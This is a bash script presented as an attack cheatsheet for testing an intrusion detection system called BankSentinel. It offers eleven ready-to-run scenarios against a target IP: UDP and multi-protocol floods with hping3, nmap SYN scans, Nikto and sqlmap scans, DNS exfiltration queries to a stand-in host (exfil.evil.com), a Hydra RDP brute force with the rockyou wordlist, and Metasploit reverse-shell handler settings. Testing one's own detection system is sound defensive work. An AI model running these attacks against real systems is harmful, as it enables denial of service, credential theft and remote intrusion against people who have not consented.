#!/bin/bash
# ============================================================
#  BankSentinel — Parrot OS Attack Cheatsheet
#  Run these commands from your Parrot OS machine to test
#  the BankSentinel IDS deployed on your Windows server.
#
#  Usage: Set TARGET_IP to your Windows machine's IP address
#         Then run individual scenarios below.
# ============================================================

TARGET_IP="${1:-192.168.1.100}"   # Pass as argument or edit here

echo "╔══════════════════════════════════════════════╗"
echo "║  BankSentinel — Parrot OS Attack Toolkit     ║"
echo "║  Target: $TARGET_IP                          ║"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "Select a scenario:"
echo "  1) [C4] JA3 Fingerprint — TLS with suspicious ciphers"
echo "  2) [C4] C2 Beacon Timing — Periodic HTTP beaconing"
echo "  3) [C2] ATM Flood — UDP flood on port 8583"
echo "  4) [C1] Lateral Movement — Nmap SYN scan"
echo "  5) [C1] Zero-Day: Full Port Scan (behavioral anomaly)"
echo "  6) [C1] Zero-Day: Protocol Mix (ICMP+TCP+UDP)"
echo "  7) [C1] Zero-Day: Web Vuln Scan (Nikto)"
echo "  8) [C1] Zero-Day: SQL Injection (SQLMap)"
echo "  9) [C1] Zero-Day: DNS Exfiltration"
echo " 10) [C1] Zero-Day: Brute Force (Hydra RDP)"
echo " 11) [C1] Zero-Day: Metasploit Reverse Shell"
echo "  q) Quit"
echo ""

read -p "Choice: " choice

case $choice in
    1)
        echo "[*] Scenario 1: TLS JA3 Fingerprint Attack"
        echo "    Connecting to $TARGET_IP:443 with specific cipher suites..."
        echo "    The sensor will extract the True JA3 hash."
        echo ""
        for i in $(seq 1 20); do
            curl -sk --tlsv1.2 \
                 --ciphers ECDHE-RSA-AES128-GCM-SHA256 \
                 "https://$TARGET_IP/" \
                 -o /dev/null -w "  [%{time_total}s] TLS Hello #$i sent\n" 2>/dev/null
            sleep 3
        done
        ;;
    2)
        echo "[*] Scenario 2: C2 Beacon Timing"
        echo "    Beaconing to $TARGET_IP:8080 every ~10 seconds..."
        echo "    Press Ctrl+C to stop."
        echo ""
        count=0
        while true; do
            count=$((count + 1))
            # Add jitter (-0.15 to +0.15)
            jitter=$(python3 -c "import random; print(random.uniform(-0.15, 0.15))")
            interval=$(python3 -c "print(10.0 + $jitter)")
            curl -s "http://$TARGET_IP:8080/" -o /dev/null 2>/dev/null
            echo "  [$(date +%X)] Beacon #$count sent (interval: ${interval}s)"
            sleep "$interval"
        done
        ;;
    3)
        echo "[*] Scenario 3: ATM Reconciliation Flood"
        echo "    UDP flooding $TARGET_IP:8583 ..."
        echo "    Press Ctrl+C to stop."
        echo ""
        sudo hping3 --udp -p 8583 --flood "$TARGET_IP" -d 1400
        ;;
    4)
        echo "[*] Scenario 4: Lateral Movement SYN Scan"
        echo "    Scanning internal service ports on $TARGET_IP ..."
        echo ""
        sudo nmap -sS -p 445,3389,1433,3306,5432,8443,22,1521,5900,9200 \
             -T4 -Pn "$TARGET_IP"
        ;;
    5)
        echo "[*] Scenario 5: Zero-Day — Full Port Scan (Behavioral Anomaly)"
        echo "    Rapid SYN scan of ALL 65535 ports on $TARGET_IP ..."
        echo "    This creates an extreme behavioral deviation from normal traffic."
        echo ""
        sudo nmap -sS -p 1-65535 --min-rate 5000 -Pn "$TARGET_IP"
        ;;
    6)
        echo "[*] Scenario 6: Zero-Day — Protocol Mix Attack"
        echo "    Sending ICMP + TCP + UDP in rapid bursts ..."
        echo "    This multi-protocol pattern has no known signature."
        echo ""
        echo "  [Phase 1] ICMP Flood..."
        sudo hping3 -1 "$TARGET_IP" -c 100 --faster 2>/dev/null &
        PID1=$!
        echo "  [Phase 2] TCP SYN Flood (port 80)..."
        sudo hping3 -S -p 80 "$TARGET_IP" -c 100 --faster 2>/dev/null &
        PID2=$!
        echo "  [Phase 3] UDP Flood (port 53)..."
        sudo hping3 --udp -p 53 "$TARGET_IP" -c 100 --faster 2>/dev/null &
        PID3=$!
        wait $PID1 $PID2 $PID3
        echo "  [Done] Multi-protocol burst complete."
        ;;
    7)
        echo "[*] Scenario 7: Zero-Day — Nikto Web Vulnerability Scan"
        echo "    Scanning $TARGET_IP for web vulnerabilities ..."
        echo "    Nikto generates highly anomalous HTTP request patterns."
        echo ""
        nikto -h "http://$TARGET_IP:8080" -Tuning 123bde
        ;;
    8)
        echo "[*] Scenario 8: Zero-Day — SQL Injection (SQLMap)"
        echo "    Testing $TARGET_IP for SQL injection vulnerabilities ..."
        echo ""
        sqlmap -u "http://$TARGET_IP:8080/?id=1" --batch --level=3 --risk=2
        ;;
    9)
        echo "[*] Scenario 9: Zero-Day — DNS Exfiltration"
        echo "    Encoding random data into DNS queries ..."
        echo "    This simulates data exfiltration over DNS tunneling."
        echo ""
        for i in $(seq 1 100); do
            data=$(head -c 20 /dev/urandom | base64 | tr -d '/+=\n')
            dig @"$TARGET_IP" "${data}.exfil.evil.com" A +short 2>/dev/null
            echo "  [$i/100] DNS query: ${data:0:16}...exfil.evil.com"
            sleep 0.1
        done
        echo "  [Done] DNS exfiltration simulation complete."
        ;;
    10)
        echo "[*] Scenario 10: Zero-Day — Brute Force (Hydra RDP)"
        echo "    Attempting RDP brute force on $TARGET_IP ..."
        echo "    NOTE: Requires /usr/share/wordlists/rockyou.txt"
        echo ""
        if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
            echo "  Decompressing rockyou.txt..."
            sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
        fi
        hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
              -t 4 -V rdp://"$TARGET_IP"
        ;;
    11)
        echo "[*] Scenario 11: Zero-Day — Metasploit Reverse Shell"
        echo "    Generating and launching a Metasploit payload ..."
        echo ""
        echo "    Run this in msfconsole:"
        echo ""
        echo "    use exploit/multi/handler"
        echo "    set PAYLOAD windows/meterpreter/reverse_tcp"
        echo "    set LHOST $(hostname -I | awk '{print $1}')"
        echo "    set LPORT 4444"
        echo "    exploit"
        echo ""
        echo "    Then deliver the payload to the target."
        ;;
    q|Q)
        echo "Exiting."
        exit 0
        ;;
    *)
        echo "Invalid choice."
        exit 1
        ;;
esac
